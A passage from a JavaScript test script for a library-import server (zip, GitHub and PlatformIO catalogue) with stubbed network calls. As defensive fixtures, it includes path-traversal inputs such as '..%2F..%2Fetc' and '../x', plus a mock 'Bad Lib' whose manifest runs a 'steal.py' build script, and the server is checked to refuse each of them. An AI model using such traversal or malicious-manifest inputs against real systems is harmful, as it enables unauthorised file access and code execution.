  try { await saveImported("user_1", unpackZipLibrary(makeZip([{ name: "Z/Z.h", data: "int z;" }]), null, "Z"), "zip"); } catch (err) { refused = err; }
  check(refused instanceof LibraryError && /20 libraries/.test(refused.message), `no more than ${MAX_LIBRARIES}`);
  check(await removeLibrary("user_1", again.id) && !fs.existsSync(path.join(tmp, "users", "user_1", "files", again.id)), "removing one deletes its files");

  const twin1 = await saveImported("user_2", unpackZipLibrary(makeZip([{ name: "a/library.properties", data: "name=Dup Lib\n" }, { name: "a/D.h", data: "" }]), null, "a"), "zip");
  const twin2 = await saveImported("user_2", unpackZipLibrary(makeZip([{ name: "b/library.properties", data: "name=Dup-Lib\n" }, { name: "b/E.h", data: "" }]), null, "b"), "zip");
  check(twin1.folder === "Dup_Lib" && twin2.folder === "Dup-Lib", "different names keep different folders");
  const twin3 = await saveImported("user_2", unpackZipLibrary(makeZip([{ name: "c/library.properties", data: "name=Dup_Lib!\n" }, { name: "c/F.h", data: "" }]), null, "c"), "zip");
  check(twin3.folder === "Dup_Lib_2", "a clashing folder gets its own", twin3.folder);

  // The routes, end to end, behind a stand-in for sign-in.
  console.log("Routes");
  const app = express();
  app.use(express.json());
  registerLibraryRoutes(app, (req, _res, next) => { req.uid = "route_user"; next(); });
  const server = http.createServer(app);
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const base = `http://127.0.0.1:${server.address().port}`;
  try {
    let res = await fetch(`${base}/api/libraries/import`, { method: "POST", headers: { "Content-Type": "application/zip", "X-File-Name": "Thing.zip" }, body: zip });
    let body = await res.json();
    check(res.ok && body.library?.name === "Thing" && body.libraries.length === 1 && body.library.headerFiles[0] === "Thing.h", "POST a .zip", JSON.stringify(body).slice(0, 200));
    res = await fetch(`${base}/api/libraries`);
    body = await res.json();
    check(body.libraries.length === 1 && body.maxLibraries === MAX_LIBRARIES && body.usedBytes > 0, "GET the list");
    res = await fetch(`${base}/api/libraries/import`, { method: "POST", headers: { "Content-Type": "application/zip" }, body: Buffer.from("PK nonsense") });
    body = await res.json();
    check(res.status === 400 && /isn't a zip/.test(body.error), "a broken zip is a plain message", body.error);
    res = await fetch(`${base}/api/libraries/import`, { method: "POST", headers: { "Content-Type": "application/zip" }, body: Buffer.alloc(11 * 1024 * 1024) });
    body = await res.json().catch(() => ({}));
    check(res.status === 413 && /larger than 10 MB/.test(body.error || ""), "an oversized upload is refused as such", `${res.status} ${body.error}`);
    res = await fetch(`${base}/api/libraries/github`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ url: "https://gitlab.com/o/r" }) });
    body = await res.json();
    check(res.status === 400 && /GitHub repository link/.test(body.error), "a link that isn't GitHub", body.error);
    res = await fetch(`${base}/api/libraries/catalogue`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ owner: "../x", name: "y" }) });
    body = await res.json();
    check(res.status === 400 && /isn't in the catalogue/.test(body.error), "a malformed catalogue name never reaches the network", body.error);
    const id = (await (await fetch(`${base}/api/libraries`)).json()).libraries[0].id;
    res = await fetch(`${base}/api/libraries/${id}`, { method: "DELETE" });
    body = await res.json();
    check(res.ok && body.libraries.length === 0, "DELETE one");
    res = await fetch(`${base}/api/libraries/..%2F..%2Fetc`, { method: "DELETE" });
    check(res.status === 400, "DELETE with an odd id is refused");
  } finally {
    server.close();
  }
} finally {
  setLibrariesRoot(null);
  fs.rmSync(tmp, { recursive: true, force: true });
}

console.log("The catalogue and GitHub, with the network stood in");
{
  const { checkCatalogueLibrary, addCatalogueLibrary, searchCatalogue, catalogueVersions, importFromGithub } = await import("../server/libraries.ts");
  const crypto = await import("crypto");
  const sha = (b) => crypto.createHash("sha256").update(b).digest("hex");
  const pkgTar = (manifest, extra = []) => makeTarGz([{ name: "library.json", data: JSON.stringify(manifest) }, ...extra]);
  const dht146 = pkgTar(
    { name: "DHT sensor library", version: "1.4.6", dependencies: [{ owner: "adafruit", name: "Adafruit Unified Sensor", version: "^1.1" }] },
    [{ name: "DHT.h", data: "class DHT { public: DHT(uint8_t pin, uint8_t type); void begin(); float readTemperature(); };" }, { name: "DHT_U.h", data: "" }, { name: "DHT.cpp", data: "" }],
  );
  const dht144 = pkgTar({ name: "DHT sensor library", version: "1.4.4" }, [{ name: "DHT.h", data: "class DHT {};" }]);
  const sensor = pkgTar({ name: "Adafruit Unified Sensor", version: "1.1.14" }, [{ name: "Adafruit_Sensor.h", data: "" }]);
  const evil = pkgTar({ name: "Bad Lib", build: { extraScript: "steal.py" } }, [{ name: "Bad.h", data: "" }]);
  const needsEvil = pkgTar({ name: "Nice Front", dependencies: ["Bad Lib"] }, [{ name: "Nice.h", data: "" }]);
  const files = {
    "https://dl.example/dht-1.4.6.tar.gz": dht146, "https://dl.example/dht-1.4.4.tar.gz": dht144,
    "https://dl.example/sensor.tar.gz": sensor, "https://dl.example/bad.tar.gz": evil, "https://dl.example/nice.tar.gz": needsEvil,
    "https://dl.example/corrupt.tar.gz": dht146,
  };
  const version = (name, url, released, sum = sha(files[url])) => ({ name, released_at: released, files: [{ system: "*", download_url: url, checksum: { sha256: sum } }] });
  const packages = {
    "adafruit/dht%20sensor%20library": { owner: { username: "adafruit" }, name: "DHT sensor library", versions: [version("1.4.4", "https://dl.example/dht-1.4.4.tar.gz", "2022-01-01"), version("1.4.6", "https://dl.example/dht-1.4.6.tar.gz", "2023-01-01")] },
    "adafruit/adafruit%20unified%20sensor": { owner: { username: "adafruit" }, name: "Adafruit Unified Sensor", versions: [version("1.1.14", "https://dl.example/sensor.tar.gz", "2023-01-01")] },
    "evil/bad%20lib": { owner: { username: "evil" }, name: "Bad Lib", versions: [version("1.0.0", "https://dl.example/bad.tar.gz", "2024-01-01")] },
    "nice/nice%20front": { owner: { username: "nice" }, name: "Nice Front", versions: [version("2.0.0", "https://dl.example/nice.tar.gz", "2024-01-01")] },
    "odd/corrupt": { owner: { username: "odd" }, name: "Corrupt", versions: [version("1.0.0", "https://dl.example/corrupt.tar.gz", "2024-01-01", "0".repeat(64))] },
  };
  const ghZip = makeZip([{ name: "r-HEAD/library.properties", data: "name=Remote\nversion=1.0.0\n" }, { name: "r-HEAD/Remote.h", data: "class Remote { public: void on(); };" }]);
  const branchZip = makeZip([{ name: "r-feature-x/libs/Sub/Sub.h", data: "int sub();" }, { name: "r-feature-x/other.h", data: "" }]);
  const downloads = [];
  const realFetch = globalThis.fetch;
  globalThis.fetch = async (input) => {
    const url = String(input);
    const u = new URL(url);
    const json = (v, status = 200) => new Response(JSON.stringify(v), { status, headers: { "content-type": "application/json" } });
    if (u.hostname === "api.registry.platformio.org") {
      if (u.pathname === "/v3/search") {
        const q = u.searchParams.get("query");
        if (q === 'type:"library" name:"bad lib"') return json({ items: [{ owner: { username: "evil" }, name: "Bad Lib", type: "library" }] });
        return json({ total: 2, page: 1, limit: 10, items: [
          { owner: { username: "adafruit" }, name: "DHT sensor library", type: "library", description: "Arduino library for DHT11, DHT22", version: { name: "1.4.6", released_at: "2023-01-01" } },
          { owner: { username: "../bad" }, name: "Hidden", type: "library", version: { name: "1" } },
        ] });
      }
      const key = u.pathname.replace("/v3/packages/", "").replace("/library/", "/");
      return packages[key] ? json(packages[key]) : json({}, 404);
    }
    if (u.hostname === "dl.example") { downloads.push(url); return new Response(files[url]); }
    if (u.hostname === "codeload.github.com") {
      if (u.pathname === "/o/r/zip/HEAD") return new Response(ghZip);
      if (u.pathname === "/o/r/zip/feature/x") return new Response(branchZip);
      return new Response("Not Found", { status: 404 });
    }
    return new Response("blocked", { status: 599 });
  };
  const tmp2 = fs.mkdtempSync(path.join(os.tmpdir(), "libs-net-"));
  setLibrariesRoot(tmp2);
  try {
    const found = await searchCatalogue("dht");
    check(found.items.length === 1 && found.items[0].name === "DHT sensor library" && found.items[0].owner === "adafruit" && found.items[0].version === "1.4.6", "search: results, minus ones that couldn't be added", JSON.stringify(found.items));
    const versions = await catalogueVersions("adafruit", "DHT sensor library");
    check(versions.map((v) => v.version).join(",") === "1.4.6,1.4.4", "versions, newest first");

    const ok = await checkCatalogueLibrary("adafruit", "DHT sensor library");
    check(ok.ok && ok.spec === "adafruit/DHT sensor library@1.4.6", "the newest version is checked and pinned", JSON.stringify(ok));
    check(ok.headers.includes("DHT") && ok.headerFiles[0] === "DHT.h" && /class DHT \{ DHT\(uint8_t pin, uint8_t type\); void begin\(\); float readTemperature\(\); \}/.test(ok.summary), "its headers and API", ok.summary);
    check(downloads.includes("https://dl.example/sensor.tar.gz"), "and the library it depends on is checked too");
    const before = downloads.length;
    await checkCatalogueLibrary("adafruit", "DHT sensor library");
    check(downloads.length === before, "a version checked once is not downloaded again");
    check(fs.existsSync(path.join(tmp2, "catalogue-checks.json")), "the verdict is kept on disk");

    const bad = await checkCatalogueLibrary("evil", "Bad Lib");
    check(!bad.ok && /can't be added: it runs a build script of its own/.test(bad.error), "a library with a script is refused", bad.error);
    const front = await checkCatalogueLibrary("nice", "Nice Front");
    check(!front.ok && /needs “Bad Lib”, which runs a build script/.test(front.error), "so is one that needs it, found by name", front.error);
    let tempErr = null;
    try { await checkCatalogueLibrary("odd", "Corrupt"); } catch (err) { tempErr = err; }
    check(tempErr && /didn't download correctly/.test(tempErr.message) && !JSON.parse(fs.readFileSync(path.join(tmp2, "catalogue-checks.json"), "utf8"))["odd/corrupt@1.0.0"], "a download that doesn't match its checksum is refused, and not remembered");

    const added = await addCatalogueLibrary("net_user", "adafruit", "DHT sensor library");
    check(added.spec === "adafruit/DHT sensor library@1.4.6" && listLibraries("net_user").length === 1, "added to the account, pinned");
    const older = await addCatalogueLibrary("net_user", "adafruit", "DHT sensor library", "1.4.4");
    check(older.id === added.id && listLibraries("net_user").length === 1 && listLibraries("net_user")[0].version === "1.4.4", "picking another version replaces it");
    let refusedAdd = null;
    try { await addCatalogueLibrary("net_user", "evil", "Bad Lib"); } catch (err) { refusedAdd = err; }
    check(refusedAdd && /build script/.test(refusedAdd.message) && listLibraries("net_user").length === 1, "a refused one is never added");
    const build = fs.mkdtempSync(path.join(os.tmpdir(), "build-net-"));
    const libs = prepareLibraries("net_user", "#include <DHT.h>", build);
    const deps = mergeLibDeps(libs.libDeps, detectLibDeps("#include <DHT.h>" + libs.extraIncludes, libs.skipHeaders));
    check(JSON.stringify(deps) === JSON.stringify(["adafruit/DHT sensor library@1.4.4"]), "the build gets exactly the pinned version, not the automatic one", JSON.stringify(deps));
    fs.rmSync(build, { recursive: true, force: true });

    const remote = await importFromGithub("net_user", "https://github.com/o/r");
    check(remote.name === "Remote" && remote.kind === "github" && remote.origin === "https://github.com/o/r", "a GitHub link is downloaded and imported");
    const sub = await importFromGithub("net_user", "https://github.com/o/r/tree/feature/x/libs/Sub");
    check(sub.name === "Sub" && sub.origin === "https://github.com/o/r/tree/feature/x/libs/Sub" && sub.headers.join() === "Sub", "a folder on a branch with a slash in its name", JSON.stringify({ name: sub.name, origin: sub.origin }));
    let missing = null;
    try { await importFromGithub("net_user", "https://github.com/o/private-one"); } catch (err) { missing = err; }
    check(missing && /Only public repositories/.test(missing.message), "a private or missing repository says so", missing?.message);
  } finally {
    globalThis.fetch = realFetch;
    setLibrariesRoot(null);
    fs.rmSync(tmp2, { recursive: true, force: true });
  }
}

console.log("Nothing names the build system");
{
  const read = (p) => fs.readFileSync(new URL(`../${p}`, import.meta.url), "utf8");
  for (const p of ["src/components/LibrariesModal.tsx", "src/lib/libraries.ts", "server/libraryManifest.ts", "server/archive.ts"]) {
    // The builder class names a manifest may name are compared against, never shown.
    const hits = read(p).split("\n").filter((l) => /platformio|\bpio\b/i.test(l.replace(/"PlatformIOLibBuilder"/g, "")) && !/^\s*(\/\/|\*|\/\*)/.test(l));
    check(!hits.length, `${p}`, hits.join(" | "));
  }
  const server = read("server/libraries.ts").split("\n").filter((l) => /platformio/i.test(l) && !/^\s*(\/\/|\*|\/\*)/.test(l));
  check(server.length === 1 && /const REGISTRY = "https:\/\/api\.registry\.platformio\.org"/.test(server[0]), "server/libraries.ts: only the catalogue's address, never shown", server.join(" | "));
}

console.log(bad ? `\n${bad} FAILED` : "\nall ok");
process.exit(bad ? 1 : 0);
